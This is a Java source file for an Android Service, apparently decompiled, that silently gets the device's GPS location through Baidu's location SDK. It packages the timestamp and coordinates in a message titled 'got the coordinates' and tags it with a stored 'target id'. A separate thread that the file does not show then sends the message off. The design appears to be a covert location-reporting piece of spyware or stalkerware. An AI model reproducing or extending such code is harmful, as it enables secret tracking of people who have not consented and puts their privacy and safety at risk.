package com.example.service;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import android.util.Log;
import com.baidu.location.BDLocation;
import com.baidu.location.BDLocationListener;
import com.baidu.location.LocationClient;
import com.baidu.location.LocationClientOption;
import com.baidu.location.LocationClientOption.LocationMode;
import com.example.db.GeneralData;
import com.example.db.LocData;
import com.example.thread.SendMsgThread;
import com.example.utils.MyUtils;
import com.example.utils.SharedpreferencesUtil;

import java.io.PrintStream;

public class GetLocationService extends Service {
	private MyListener listener;
	private LocationClient mLocationClient;
	private LocationClientOption.LocationMode tempMode = LocationClientOption.LocationMode.Hight_Accuracy;
	private String tempcoor = "bd09ll";

	private void initLocation() {
		LocationClientOption localLocationClientOption = new LocationClientOption();
		localLocationClientOption.setLocationMode(this.tempMode);
		localLocationClientOption.setCoorType(this.tempcoor);
		localLocationClientOption.setScanSpan(0);
		localLocationClientOption.setOpenGps(true);
		localLocationClientOption.setLocationNotify(true);
		localLocationClientOption.setIgnoreKillProcess(true);
		this.mLocationClient.setLocOption(localLocationClientOption);
	}

	public IBinder onBind(Intent paramIntent) {
		return null;
	}

	public void onCreate() {
		System.out.println("service on creat");
		this.mLocationClient = new LocationClient(getApplicationContext());
		initLocation();
		this.mLocationClient.start();
		this.listener = new MyListener();
		this.mLocationClient.registerLocationListener(this.listener);
		super.onCreate();
	}

	public void onDestroy() {
		System.out.println("service onDestroy");
		super.onDestroy();
	}

	public int onStartCommand(Intent paramIntent, int paramInt1, int paramInt2) {
		System.out.println("service onStartCommand");
		return super.onStartCommand(paramIntent, paramInt1, paramInt2);
	}

	private class MyListener implements BDLocationListener {
		private MyListener() {
		}

		public void onReceiveLocation(BDLocation paramBDLocation) {
			String content = String.valueOf(System.currentTimeMillis()) + "#"
					+ paramBDLocation.getLongitude() + "#"
					+ paramBDLocation.getLatitude();
			GeneralData gd = new GeneralData("坐标已到手", content,
					GeneralData.TYPE_LOCATION, new SharedpreferencesUtil(
							getApplicationContext()).getTargetId());
			new SendMsgThread(gd, getApplicationContext()).start();
			GetLocationService.this.mLocationClient
					.unRegisterLocationListener(GetLocationService.this.listener);
			GetLocationService.this.stopSelf();
		}
	}
}